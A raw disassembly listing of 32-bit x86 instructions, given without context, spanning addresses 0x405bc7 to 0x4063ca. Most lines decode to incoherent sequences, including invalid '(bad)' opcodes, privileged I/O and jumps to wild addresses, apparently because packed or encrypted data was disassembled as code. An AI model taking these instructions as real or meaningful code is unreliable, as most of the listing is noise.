  405bc7:	imul   ecx,DWORD PTR [ebp-0x4c2845ea],0xffffffda
  405bce:	pop    edx
  405bcf:	mov    eax,0xa6aff78b
  405bd4:	arpl   WORD PTR [ebp-0x32],ax
  405bd7:	add    al,0xbe
  405bd9:	stc    
  405bda:	das    
  405bdb:	cmp    ah,BYTE PTR [ebx+0x582964c7]
  405be1:	iret   
  405be2:	dec    eax
  405be3:	(bad)  
  405be4:	arpl   WORD PTR [edx+eax*4+0x4d],ax
  405be8:	push   0x67
  405bea:	fdiv   st,st(5)
  405bec:	mov    al,ds:0xdedd6ef6
  405bf1:	mov    al,ds:0xb848f05
  405bf6:	dec    ecx
  405bf7:	je     0x405b89
  405bf9:	pop    ecx
  405bfa:	push   esi
  405bfb:	push   DWORD PTR [ebx+esi*8-0xa]
  405bff:	jmp    0x405be2
  405c01:	dec    ebx
  405c02:	mov    DWORD PTR [eax+ebp*1+0x6],ebp
  405c06:	pop    ss
  405c07:	lods   al,BYTE PTR ds:[esi]
  405c08:	test   DWORD PTR [ebx],ebx
  405c0a:	jbe    0x405bf0
  405c0c:	mov    al,0x25
  405c0e:	ret    0x8e99
  405c11:	test   DWORD PTR [edi+0x6473bf19],edx
  405c17:	outs   dx,BYTE PTR ds:[esi]
  405c18:	call   0x51943d87
  405c1d:	dec    esi
  405c1e:	mov    WORD PTR [edx-0x11066ea7],?
  405c24:	mov    bh,0xed
  405c26:	ins    DWORD PTR es:[edi],dx
  405c27:	push   ss
  405c28:	mov    dl,0xcb
  405c2a:	ss and eax,0xb7eadfa4
  405c30:	fldcw  WORD PTR [esp+edi*8+0x4388849b]
  405c37:	dec    eax
  405c38:	mov    ecx,0xa74cc86f
  405c3d:	(bad)  
  405c3e:	pop    edx
  405c3f:	(bad)  
  405c40:	jnp    0x405c3a
  405c42:	add    eax,0xaccd42d5
  405c47:	(bad)  
  405c49:	jecxz  0x405c46
  405c4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c4c:	mov    ss,WORD PTR [ecx-0x3a37ff05]
  405c52:	mov    esi,eax
  405c54:	adc    cl,bh
  405c56:	inc    esp
  405c57:	es cmp eax,0x7cc98585
  405c5d:	out    0x88,al
  405c5f:	push   ss
  405c60:	imul   DWORD PTR [edi-0x40694451]
  405c66:	jns    0x405caf
  405c68:	aas    
  405c69:	repnz repz retf 0x89df
  405c6e:	shr    DWORD PTR [esi-0x71],cl
  405c71:	ret    0x354d
  405c74:	sbb    al,0x75
  405c76:	push   es
  405c77:	sbb    DWORD PTR [ecx],edx
  405c79:	sbb    BYTE PTR [edx],dh
  405c7b:	rcr    DWORD PTR [ebx-0x438f3f47],1
  405c81:	cwde   
  405c82:	int3   
  405c83:	in     al,0x65
  405c85:	pop    edi
  405c86:	mov    al,0xd3
  405c88:	mov    esp,0x51d712ee
  405c8d:	adc    edi,DWORD PTR [esi+0x5d]
  405c90:	jnp    0x405c3a
  405c92:	pop    esi
  405c93:	xor    bl,BYTE PTR [ebp+0x73c8e8f]
  405c99:	punpckldq mm4,DWORD PTR [esi-0x1c]
  405c9d:	and    ecx,DWORD PTR [edx]
  405c9f:	dec    ecx
  405ca0:	cmp    bh,bh
  405ca2:	enter  0x8aa6,0x5d
  405ca6:	pop    ebx
  405ca7:	pop    esp
  405ca8:	clc    
  405ca9:	adc    al,BYTE PTR ss:[bx+si+0x58]
  405cae:	add    al,0xe7
  405cb0:	into   
  405cb1:	mov    al,ds:0xff0cd935
  405cb6:	loope  0x405d0d
  405cb8:	fsubr  DWORD PTR [ebp+0x37]
  405cbb:	inc    esp
  405cbc:	popf   
  405cbd:	mov    esi,0xc2880fb5
  405cc2:	mov    ds:0xeab9ce60,eax
  405cc7:	push   ss
  405cc8:	jecxz  0x405cc1
  405cca:	pop    esp
  405ccb:	retf   0x9ea4
  405cce:	inc    edi
  405ccf:	cmc    
  405cd0:	push   edi
  405cd1:	jns    0x405cc1
  405cd3:	stos   BYTE PTR es:[edi],al
  405cd4:	mov    al,0x16
  405cd6:	bound  esp,QWORD PTR cs:[ecx]
  405cd9:	ficomp WORD PTR [edi-0x29f17c79]
  405cdf:	(bad)  
  405ce1:	push   eax
  405ce2:	adc    al,0x41
  405ce4:	or     ch,BYTE PTR [ebp+ebp*2-0x51e49602]
  405ceb:	enter  0x5511,0xab
  405cef:	enter  0x90ef,0xc0
  405cf3:	dec    ebx
  405cf4:	push   ebp
  405cf5:	imul   ebx,DWORD PTR [ebx-0x2b54f243],0xd2951365
  405cff:	aad    0xe
  405d01:	sahf   
  405d02:	or     DWORD PTR [ecx-0x30],edi
  405d05:	xchg   BYTE PTR [edx+0x68],bl
  405d08:	mov    ebp,0x719486
  405d0d:	(bad)  
  405d0e:	stc    
  405d0f:	aad    0x2
  405d11:	clc    
  405d12:	cdq    
  405d13:	test   DWORD PTR [esi+ecx*1-0x5284cd3b],esp
  405d1a:	push   ebx
  405d1b:	test   al,0x7c
  405d1d:	push   cs
  405d1e:	push   edi
  405d1f:	(bad)  
  405d20:	jb     0x405d68
  405d22:	push   ebp
  405d23:	mov    ch,0xab
  405d25:	mov    edx,0x82a16aef
  405d2a:	xlat   BYTE PTR ds:[ebx]
  405d2b:	inc    esi
  405d2c:	xchg   ecx,eax
  405d2d:	inc    edi
  405d2e:	sub    dh,BYTE PTR [ebp+0x4f]
  405d31:	stc    
  405d32:	dec    esp
  405d33:	xor    al,0x3f
  405d35:	or     eax,0x51654783
  405d3a:	test   ecx,ecx
  405d3c:	out    dx,al
  405d3d:	imul   esi,DWORD PTR [eax+eax*1],0x2044037a
  405d44:	ret    
  405d45:	and    eax,0xcabf8913
  405d4a:	pop    edi
  405d4b:	mov    ebx,0x62cbad2e
  405d50:	adc    BYTE PTR [ebp+0x1ce1e762],al
  405d56:	jmp    FWORD PTR [esi+0x15ec7fb3]
  405d5c:	jg     0x405dd7
  405d5e:	mov    eax,0x89e1d48e
  405d63:	mov    edx,0xbab76ec9
  405d68:	popf   
  405d69:	mov    ah,BYTE PTR ds:0x2880021d
  405d6f:	add    bh,cl
  405d71:	push   ecx
  405d72:	pusha  
  405d73:	pop    ebp
  405d74:	pop    esi
  405d75:	mov    ?,esp
  405d77:	sti    
  405d78:	popf   
  405d79:	mov    DWORD PTR [eax+ebx*1+0x59d2cf73],0xafd38d41
  405d84:	leave  
  405d85:	mov    al,BYTE PTR [ebp+0x1d]
  405d88:	push   ss
  405d89:	adc    BYTE PTR [ebx+0xf],bl
  405d8c:	cwde   
  405d8d:	ins    DWORD PTR es:[edi],dx
  405d8e:	out    0xd0,eax
  405d90:	sbb    al,BYTE PTR [ebx+ecx*4-0x7f740fbb]
  405d97:	cwde   
  405d98:	add    DWORD PTR [eax],eax
  405d9a:	add    bh,bh
  405d9c:	xor    al,ch
  405d9e:	and    esi,DWORD PTR [eax+0x0]
  405da1:	add    BYTE PTR [ecx+0x7d83f845],cl
  405da7:	clc    
  405da8:	add    BYTE PTR [ebp-0xc16fbbb],cl
  405dae:	add    DWORD PTR [eax],eax
  405db0:	add    BYTE PTR [ebx+0x518ed1c9],dl
  405db6:	xchg   esi,eax
  405db7:	push   ecx
  405db8:	shl    DWORD PTR [edx+0x609c135b],1
  405dbe:	cmp    al,0xf1
  405dc0:	adc    DWORD PTR [edi+0x37],eax
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405d9c
  405dca:	add    eax,0xfca8d0f4
  405dcf:	dec    ecx
  405dd0:	stos   DWORD PTR es:[edi],eax
  405dd1:	cmp    BYTE PTR [ecx],0xbf
  405dd4:	clc    
  405dd5:	jae    0x405e49
  405dd7:	pop    ds
  405dd8:	push   ss
  405dd9:	int3   
  405dda:	js     0x405dbf
  405ddc:	push   0xffffff8b
  405dde:	mov    es,WORD PTR [ebx+0x52cde837]
  405de4:	fwait
  405de5:	addr16 mov ds:0xa328,al
  405de9:	into   
  405dea:	loope  0x405e32
  405dec:	in     eax,dx
  405ded:	stc    
  405dee:	push   cs
  405def:	xor    BYTE PTR [eax+eiz*4-0x42422509],dh
  405df6:	and    dh,ch
  405df8:	xchg   edx,eax
  405df9:	mov    eax,0xc13a4466
  405dfe:	lea    ecx,[esi-0x6e27b739]
  405e04:	pop    ss
  405e05:	out    dx,al
  405e06:	xchg   edx,eax
  405e07:	pop    ecx
  405e08:	(bad)  
  405e09:	pop    esp
  405e0a:	sub    esp,DWORD PTR [ecx+0x3f0e47ba]
  405e10:	dec    ebx
  405e11:	mov    esp,0x8383992e
  405e16:	ret    0xb62d
  405e19:	shl    BYTE PTR [edx-0x7880cb8f],0x99
  405e20:	icebp  
  405e21:	repnz scas eax,DWORD PTR es:[edi]
  405e23:	adc    dl,cl
  405e25:	idiv   BYTE PTR ds:0xb3015394
  405e2b:	dec    ebp
  405e2c:	xor    BYTE PTR [edi],al
  405e2e:	pop    eax
  405e2f:	sbb    ch,dl
  405e31:	loope  0x405e98
  405e33:	jge    0x405de8
  405e35:	cmp    eax,0x93f92f6c
  405e3a:	sub    al,0x7e
  405e3c:	rcr    BYTE PTR [ebp-0x54d99f97],cl
  405e42:	jb     0x405e20
  405e44:	mov    ah,0xc8
  405e46:	(bad)  
  405e47:	or     BYTE PTR [edx-0x65],0xd4
  405e4b:	add    al,0x3d
  405e4d:	push   ecx
  405e4e:	sub    eax,DWORD PTR [edi+0x41]
  405e51:	dec    eax
  405e52:	mov    ?,WORD PTR [edx-0x48]
  405e55:	mov    eax,ds:0x348fc3d2
  405e5a:	mov    esi,0x1990d2bf
  405e5f:	fcomp  DWORD PTR [ebx]
  405e61:	mov    eax,0x8130d2f
  405e66:	cmp    al,0x6a
  405e68:	xlat   BYTE PTR ds:[ebx]
  405e69:	cwde   
  405e6a:	in     al,dx
  405e6b:	sbb    DWORD PTR [eax-0x17],ecx
  405e6e:	xor    ebx,DWORD PTR [ebx-0x2e]
  405e71:	hlt    
  405e72:	pop    edx
  405e73:	or     eax,0x8fe73cb
  405e78:	xchg   esp,eax
  405e79:	rol    BYTE PTR [edi+esi*2-0x41e50c6],0x46
  405e81:	out    dx,al
  405e82:	daa    
  405e83:	xor    cl,bl
  405e85:	mov    ch,0x67
  405e87:	mov    eax,0x7b367645
  405e8c:	outs   dx,BYTE PTR ds:[esi]
  405e8d:	cmp    al,bl
  405e8f:	sahf   
  405e90:	push   esi
  405e91:	sbb    eax,0xddf4e8b4
  405e96:	cwde   
  405e97:	test   eax,ebp
  405e99:	inc    ebp
  405e9a:	rol    DWORD PTR [esi],1
  405e9c:	add    edx,ecx
  405e9e:	jmp    0x405e2f
  405ea0:	adc    eax,0x4955bfe
  405ea5:	ror    DWORD PTR [eax+ecx*4-0x35],cl
  405ea9:	dec    ecx
  405eaa:	psubw  mm2,QWORD PTR ds:0x980d81c
  405eb1:	scas   eax,DWORD PTR es:[edi]
  405eb2:	pop    ebx
  405eb3:	add    al,0x4d
  405eb5:	add    bh,bh
  405eb7:	outs   dx,WORD PTR ds:[esi]
  405eb9:	dec    eax
  405eba:	pop    ds
  405ebb:	jbe    0x405f18
  405ebd:	xor    al,0xf
  405ebf:	loop   0x405e98
  405ec1:	shl    dh,1
  405ec3:	add    ebp,DWORD PTR [edx+0x4c86935]
  405ec9:	add    edx,esp
  405ecb:	retf   0xbf49
  405ece:	outs   dx,DWORD PTR ds:[esi]
  405ecf:	mov    BYTE PTR [ecx+0x19726d54],dh
  405ed5:	cmc    
  405ed6:	xchg   edi,eax
  405ed7:	add    esi,DWORD PTR [eax]
  405ed9:	or     bh,dl
  405edb:	iret   
  405edc:	mov    cl,BYTE PTR [ecx]
  405ede:	sub    dh,ah
  405ee0:	arpl   bp,bx
  405ee2:	inc    ecx
  405ee3:	pop    es
  405ee4:	jnp    0x405f4d
  405ee6:	pop    ebp
  405ee7:	ja     0x405e75
  405ee9:	push   esp
  405eea:	test   DWORD PTR [ecx+esi*4+0x3f],ebp
  405eee:	and    al,0x86
  405ef0:	jge    0x405ea3
  405ef2:	and    BYTE PTR [ecx],bl
  405ef4:	(bad)  
  405ef5:	stos   BYTE PTR es:[edi],al
  405ef6:	xchg   ebx,eax
  405ef7:	test   al,0x37
  405ef9:	shl    DWORD PTR [edx+0x35],1
  405efc:	lds    edi,FWORD PTR [edi]
  405efe:	add    BYTE PTR [ecx],bl
  405f00:	(bad)  
  405f01:	jp     0x405edd
  405f03:	mov    WORD PTR [esp+edx*8-0x33],ss
  405f07:	push   0x27
  405f09:	hlt    
  405f0a:	jae    0x405f69
  405f0c:	in     al,dx
  405f0d:	aam    0x99
  405f0f:	pop    ds
  405f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f11:	xor    al,0x11
  405f13:	shr    BYTE PTR [esi],0xef
  405f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f17:	mov    DWORD PTR [edx-0x184e149b],ebp
  405f1d:	fcom   QWORD PTR [ebp-0x78]
  405f20:	jmp    0xfa85:0xa155b710
  405f27:	gs or  cl,dh
  405f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f2b:	add    eax,DWORD PTR [ebp+ecx*2+0x5cb0ee0c]
  405f32:	and    DWORD PTR [eax-0x1b1cf115],esp
  405f38:	add    al,0x81
  405f3a:	sub    al,0x1
  405f3c:	out    dx,eax
  405f3d:	das    
  405f3e:	add    DWORD PTR [ebx+0x50f2af49],0x54
  405f45:	ja     0x405fb0
  405f47:	mov    al,BYTE PTR [eax+0x14]
  405f4a:	mov    dh,0x57
  405f4c:	sbb    al,0xa2
  405f4e:	leave  
  405f4f:	out    0x14,eax
  405f51:	sbb    esi,DWORD PTR [ecx]
  405f53:	and    al,0x5b
  405f55:	in     al,dx
  405f56:	push   cs
  405f57:	sbb    dl,BYTE PTR [ebp-0x3f00b03a]
  405f5d:	in     eax,0xc6
  405f5f:	jne    0x405f03
  405f61:	mov    BYTE PTR [edx+0x4027787f],ch
  405f67:	clc    
  405f68:	sti    
  405f69:	push   eax
  405f6a:	les    esi,FWORD PTR [ecx]
  405f6c:	dec    edx
  405f6d:	xchg   ebp,eax
  405f6e:	aam    0xd7
  405f70:	add    BYTE PTR [edx+0x3a20a6ad],0xe
  405f77:	(bad)
  405f7a:	or     dl,BYTE PTR [ebp-0x35]
  405f7d:	dec    edx
  405f7e:	cli    
  405f7f:	retf   
  405f80:	push   0xe9339a78
  405f85:	jbe    0x405f75
  405f87:	test   edi,0x748751a3
  405f8d:	daa    
  405f8e:	js     0x405f80
  405f90:	shl    DWORD PTR [edx+esi*2],1
  405f93:	jg     0x405fd1
  405f95:	cmp    dh,BYTE PTR [edi+0x5d]
  405f98:	bound  edi,QWORD PTR [edi+edx*1-0x1da48a25]
  405f9f:	fdiv   DWORD PTR [ecx+esi*8]
  405fa2:	ins    DWORD PTR es:[edi],dx
  405fa3:	add    al,0x89
  405fa5:	inc    ebp
  405fa6:	loopne 0x405fb7
  405fa8:	test   BYTE PTR [esi-0x16fffff6],dl
  405fae:	repz add DWORD PTR [eax],eax
  405fb1:	add    bl,ch
  405fb3:	hlt    
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx-0x3e]
  405fbf:	repz sub dh,BYTE PTR [ebp+0x7e7e359a]
  405fc6:	push   ebp
  405fc7:	jg     0x406047
  405fc9:	jle    0x405f52
  405fcb:	adc    eax,0xf42cb74c
  405fd0:	les    ecx,FWORD PTR [ebp-0x7fb463f9]
  405fd6:	rcl    DWORD PTR [edx-0x17],1
  405fd9:	or     eax,0x3587c3ff
  405fde:	mov    al,ds:0xaf285cd8
  405fe3:	test   eax,0xdcdb54e8
  405fe8:	cdq    
  405fe9:	pop    esp
  405fea:	outs   dx,BYTE PTR ds:[esi]
  405feb:	or     bh,BYTE PTR [ecx-0x39]
  405fee:	sbb    BYTE PTR [ecx+0x5b],0xee
  405ff2:	call   0xdff1339a
  405ff7:	test   BYTE PTR [esi-0xa],dl
  405ffa:	mov    ebx,0xa6d5173c
  405fff:	mov    bl,0x14
  406001:	xor    al,0xbb
  406003:	cmp    al,0x29
  406005:	push   edx
  406006:	arpl   ax,bp
  406008:	jbe    0x405f91
  40600a:	mov    ah,0x32
  40600c:	add    DWORD PTR [edx],ebx
  40600e:	ret    
  40600f:	jmp    0x406058
  406011:	popa   
  406012:	lahf   
  406013:	dec    edi
  406014:	and    eax,0xda0cfb9d
  406019:	pop    ebp
  40601a:	push   ebx
  40601b:	cmp    edx,ebx
  40601d:	adc    DWORD PTR [edi-0x33],eax
  406020:	add    eax,0x1e00d1b4
  406025:	inc    ebx
  406026:	outs   dx,DWORD PTR ds:[esi]
  406027:	test   eax,0xc78262c5
  40602c:	shr    bh,1
  40602e:	push   ecx
  40602f:	sbb    BYTE PTR [eax+0x50a4e781],bh
  406035:	retf   0x2dea
  406038:	or     BYTE PTR ds:0x1066,bh
  40603d:	call   0xc7e77db1
  406042:	jge    0x406056
  406044:	pop    edx
  406045:	loope  0x4060a0
  406047:	inc    edi
  406048:	jne    0x40603f
  40604a:	xor    DWORD PTR [edx+ebp*4],edx
  40604d:	push   0xefc02460
  406052:	aas    
  406053:	push   ebx
  406054:	mov    ds:0x5eb975f7,eax
  406059:	data16 lahf 
  40605b:	imul   esi,ecx,0xffffff87
  40605e:	push   ecx
  40605f:	mov    edi,0x6ba496ac
  406064:	jp     0x4060cc
  406066:	adc    al,ch
  406068:	(bad)  
  406069:	jl     0x4060e8
  40606b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40606c:	adc    cl,BYTE PTR [eax+edi*8]
  40606f:	jge    0x4060ee
  406071:	and    eax,0x7f42fadc
  406076:	adc    eax,0x6cf71883
  40607b:	dec    esp
  40607c:	or     BYTE PTR ds:0x273fd1,0xf9
  406083:	rcl    edi,cl
  406085:	sub    DWORD PTR ds:0x58b27a01,0xb8e8000
  40608f:	imul   edx,DWORD PTR [esi],0x2
  406092:	gs mov esp,0xa0e2bfac
  406098:	sub    BYTE PTR [ecx-0x17b2f9ef],ah
  40609e:	mov    gs,WORD PTR [ebx]
  4060a0:	xchg   esi,eax
  4060a1:	mov    edi,0xdb7cc2cd
  4060a6:	pop    edi
  4060a7:	es jnp 0x40610d
  4060aa:	mov    ecx,0x92a2c0ab
  4060af:	div    DWORD PTR [ebp+0x120f604d]
  4060b5:	dec    eax
  4060b6:	pop    ecx
  4060b7:	ret    
  4060b8:	les    ebp,FWORD PTR [edx-0x25]
  4060bb:	retf   0xf514
  4060be:	push   ds
  4060bf:	in     al,dx
  4060c0:	(bad)  
  4060c1:	xchg   DWORD PTR [esi+0x3c15a3ef],edi
  4060c7:	mov    al,ds:0xdb84497d
  4060cc:	push   0xad867afd
  4060d1:	push   ecx
  4060d2:	outs   dx,DWORD PTR ds:[esi]
  4060d3:	(bad)  
  4060d4:	mov    al,ds:0xe6d086cb
  4060d9:	(bad)  
  4060da:	aas    
  4060db:	int    0xf9
  4060dd:	cld    
  4060de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060df:	mov    DWORD PTR [ecx],ebx
  4060e1:	das    
  4060e2:	push   0x9
  4060e4:	sti    
  4060e5:	xor    esp,DWORD PTR [eax+0x4]
  4060e8:	addr16 loop 0x406128
  4060eb:	ret    
  4060ec:	mov    es,WORD PTR [ebp+0x6302dbf1]
  4060f2:	aad    0x5b
  4060f4:	sub    eax,0x922fb9c0
  4060f9:	lock lds eax,FWORD PTR ss:0x7b17a00d
  406101:	sbb    DWORD PTR [eax+eax*2+0x32],ecx
  406105:	fcmovnbe st,st(3)
  406107:	jle    0x4060d3
  406109:	dec    ebx
  40610a:	sbb    ah,BYTE PTR [eax+0x10]
  40610d:	mov    esi,DWORD PTR [ebx-0x61e7a529]
  406113:	and    DWORD PTR [edi+ecx*4+0x5],ebx
  406117:	mov    bl,0x1f
  406119:	leave  
  40611a:	les    edi,FWORD PTR [esp+eiz*4-0x3bdc0c30]
  406121:	test   al,0x3d
  406123:	push   ds
  406124:	mov    bl,0x60
  406126:	mov    bl,0x2c
  406128:	je     0x40617f
  40612a:	add    al,0x3c
  40612c:	in     al,0x83
  40612e:	std    
  40612f:	clc    
  406130:	sub    eax,0x9948fa41
  406135:	rol    DWORD PTR [edx-0x77fe6f0c],cl
  40613b:	(bad)  
  40613c:	jl     0x40616d
  40613e:	pop    ecx
  40613f:	push   esi
  406140:	mov    bl,0xf6
  406142:	push   edx
  406143:	imul   ebx,eax,0x4f
  406146:	addr16 jae 0x406133
  406149:	stos   BYTE PTR es:[edi],al
  40614a:	retf   0xd054
  40614d:	ret    0xe00c
  406150:	cwde   
  406151:	add    ebx,DWORD PTR [ebx+0x50]
  406154:	jp     0x40616c
  406156:	ins    DWORD PTR es:[edi],dx
  406157:	push   es
  406158:	sbb    eax,0xab6a39a8
  40615d:	call   0x39dc:0x2ed3b85b
  406164:	rol    DWORD PTR [ecx+ecx*4+0x76],1
  406168:	mov    dh,0x14
  40616a:	mov    ds:0x6f5965a5,al
  40616f:	push   esi
  406170:	fnsave [edi+edx*4-0x56]
  406174:	jmp    0x4da7930b
  406179:	fsub   st,st(7)
  40617b:	test   BYTE PTR [esi+edi*8],bl
  40617e:	(bad)  
  40617f:	pop    esi
  406180:	and    edx,ecx
  406182:	fchs   
  406184:	mov    edx,0x504db41
  406189:	imul   edi,DWORD PTR es:[edi],0x6e7e47db
  406190:	repnz arpl WORD PTR [eax+0x1fc5d41e],dx
  406197:	(bad)  
  406198:	jmp    0x40616a
  40619a:	jnp    0x40620e
  40619c:	mov    al,ds:0x2aac3b73
  4061a1:	fdiv   DWORD PTR [ecx+0x458d5017]
  4061a7:	call   0xd485ecfc
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	jle    0x40619c
  4061d3:	aam    0x79
  4061d5:	icebp  
  4061d6:	xor    edi,DWORD PTR [esi+0x7e]
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x4061be
  4061de:	xchg   esp,eax
  4061df:	mov    cs,WORD PTR ds:0x8e2f4e5d
  4061e5:	mov    al,BYTE PTR [ebp-0x6d9d5fed]
  4061eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061ec:	sahf   
  4061ed:	mov    ah,BYTE PTR [esi+0x7bcf7a5a]
  4061f3:	les    ecx,FWORD PTR [ebx-0x1b]
  4061f6:	or     al,0xfd
  4061f8:	std    
  4061f9:	frstor [eax-0x7655bbff]
  4061ff:	dec    ebp
  406200:	fwait
  406201:	dec    edi
  406202:	lds    ecx,FWORD PTR [ebp-0x64571194]
  406208:	mov    cl,BYTE PTR [edi+esi*4-0x1379d0b9]
  40620f:	pop    ebx
  406210:	jnp    0x4061b3
  406212:	sub    ah,BYTE PTR [eax+edx*4-0x32]
  406216:	inc    eax
  406217:	aas    
  406218:	lock jl 0x406277
  40621b:	sub    al,0xbf
  40621d:	(bad)
  406222:	sub    eax,0x47ada8c9
  406227:	(bad)  
  406228:	into   
  406229:	(bad)  
  40622a:	cmp    ebp,DWORD PTR [esi]
  40622c:	std    
  40622d:	(bad)  
  40622e:	push   0xffffffec
  406230:	fiadd  DWORD PTR [eax+0x14]
  406233:	cmp    dl,BYTE PTR [ecx]
  406235:	add    dl,BYTE PTR [ebx+0x6289cd06]
  40623b:	pop    ds
  40623c:	pop    edi
  40623d:	dec    esi
  40623e:	ret    
  40623f:	loop   0x4062a7
  406241:	pusha  
  406242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406243:	pop    ds
  406244:	cmp    al,BYTE PTR ds:0xfd8a4cc1
  40624a:	fisub  DWORD PTR [esi+0x7c]
  40624d:	xchg   ebx,eax
  40624e:	inc    ecx
  40624f:	push   es
  406250:	cdq    
  406251:	xor    ecx,DWORD PTR [esi]
  406253:	retf   0xec39
  406256:	inc    esp
  406257:	sub    al,BYTE PTR [eax]
  406259:	or     DWORD PTR [eax],esi
  40625b:	add    esi,DWORD PTR [esi-0x15]
  40625e:	aas    
  40625f:	mov    ds:0xe7a112d0,al
  406264:	imul   ebx,edx,0x2c423826
  40626a:	xchg   BYTE PTR [edi-0x53f45945],cl
  406270:	retf   
  406271:	push   edi
  406272:	fwait
  406273:	popf   
  406274:	ss test eax,0x50fee373
  40627a:	and    al,dl
  40627c:	jl     0x406206
  40627e:	mov    ebx,0xec4cc6d7
  406283:	inc    edi
  406284:	in     eax,dx
  406285:	in     al,dx
  406286:	xchg   ebp,eax
  406287:	mov    ds:0x8ee2f8d9,eax
  40628c:	popf   
  40628d:	popa   
  40628e:	sbb    al,0xf9
  406290:	sbb    al,0x26
  406292:	hlt    
  406293:	(bad)  
  406294:	into   
  406295:	pop    esp
  406296:	mov    esi,DWORD PTR [ebx+0x42fada06]
  40629c:	push   ds
  40629d:	call   0x87e9484d
  4062a2:	mov    al,ds:0x4b3cfbe
  4062a7:	mov    ecx,0x5d9f6eb5
  4062ac:	pop    esp
  4062ad:	test   bl,bh
  4062af:	xchg   esp,eax
  4062b0:	xor    BYTE PTR [ecx],ch
  4062b2:	mov    esi,0x35cb059f
  4062b7:	outs   dx,DWORD PTR ds:[esi]
  4062b8:	inc    ebp
  4062b9:	into   
  4062ba:	into   
  4062bb:	add    DWORD PTR [esi],0xffffffbc
  4062be:	xor    dh,dh
  4062c0:	add    eax,0x8289c32a
  4062c5:	rcl    BYTE PTR ds:[edx],0xf
  4062c9:	jb     0x3188ed13
  4062cf:	(bad)  
  4062d0:	xchg   ecx,eax
  4062d1:	lea    esp,[ebx-0x28]
  4062d4:	pushf  
  4062d5:	aaa    
  4062d6:	dec    ebp
  4062d7:	add    eax,0xca28d808
  4062dc:	mul    BYTE PTR [edi+0x1a3ba14a]
  4062e2:	mov    eax,0x4fa9633
  4062e7:	icebp  
  4062e8:	ins    BYTE PTR es:[edi],dx
  4062e9:	mov    eax,0xacbaed32
  4062ee:	out    0x5f,eax
  4062f0:	cmp    eax,0xb9ef2f37
  4062f5:	cmp    al,0x62
  4062f7:	jmp    0x4062b9
  4062f9:	adc    esp,ebx
  4062fb:	and    ebx,esi
  4062fd:	jp     0x40631b
  4062ff:	inc    ecx
  406300:	and    bl,dh
  406302:	inc    esp
  406303:	add    BYTE PTR [ebx-0x39cd7d3a],bl
  406309:	mov    dl,0x6e
  40630b:	sub    DWORD PTR [edx-0x5e],edx
  40630e:	imul   edi,DWORD PTR [edi-0x35],0xffffffe3
  406312:	test   esp,ebp
  406314:	out    dx,al
  406315:	sti    
  406316:	daa    
  406317:	ja     0x406360
  406319:	repz or ebx,ecx
  40631c:	repnz xor esi,DWORD PTR [ecx-0x70]
  406320:	cmp    bh,BYTE PTR [eax+0x6a51448c]
  406326:	ds mov esp,0xab9198f8
  40632c:	dec    ebx
  40632d:	arpl   WORD PTR [edx],ax
  40632f:	and    DWORD PTR [edi-0x72],ebp
  406332:	out    0x43,eax
  406334:	mov    ds:0x6916ca06,eax
  406339:	jnp    0x4062d2
  40633b:	jmp    0x283c9772
  406340:	push   ds
  406341:	lods   al,BYTE PTR ds:[esi]
  406342:	loop   0x4062db
  406344:	test   al,0xb9
  406346:	jb     0x40633b
  406348:	push   edi
  406349:	xchg   edi,eax
  40634a:	lahf   
  40634b:	inc    edi
  40634c:	test   ebp,0xa528c940
  406352:	xchg   ebp,eax
  406353:	adc    al,0xfa
  406355:	cmp    DWORD PTR [eax],esi
  406357:	fldenv [eax+0x28]
  40635a:	pop    edx
  40635b:	fwait
  40635c:	sub    BYTE PTR [eax],cl
  40635e:	leave  
  40635f:	std    
  406360:	sub    al,0x7c
  406362:	mov    BYTE PTR [esp+edi*2-0x28e65c9b],al
  406369:	ret    0xefb5
  40636c:	mov    bh,0xcf
  40636e:	and    ebp,DWORD PTR [ebx]
  406370:	sar    BYTE PTR [esi-0x7f],cl
  406373:	xchg   ebp,eax
  406374:	sub    ah,BYTE PTR [esi-0x7a]
  406377:	pop    ebx
  406378:	aad    0xaa
  40637a:	ret    0x8144
  40637d:	(bad)  
  40637f:	aas    
  406380:	pop    eax
  406381:	push   ebp
  406382:	test   DWORD PTR [edi+eiz*2],esi
  406385:	ss ins BYTE PTR es:[edi],dx
  406387:	sbb    ecx,eax
  406389:	push   ss
  40638a:	dec    ecx
  40638b:	outs   dx,BYTE PTR ds:[esi]
  40638c:	ja     0x40634b
  40638e:	gs call 0xb0cefa5e
  406394:	(bad)  
  406396:	dec    edx
  406397:	jbe    0x406349
  406399:	(bad)  
  40639a:	mov    al,0x4f
  40639c:	mov    eax,0xc3456d25
  4063a1:	or     eax,DWORD PTR [eax+0x1e]
  4063a4:	xchg   esi,esp
  4063a6:	push   0x73
  4063a8:	mov    cl,0xd8
  4063aa:	mul    DWORD PTR [esp+ecx*8+0x222d0ec9]
  4063b1:	(bad)  
  4063b2:	pop    edx
  4063b3:	dec    esp
  4063b4:	mov    edx,DWORD PTR [esp+eiz*8]
  4063b7:	push   ss
  4063b8:	push   DWORD PTR [ebp-0xc]
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
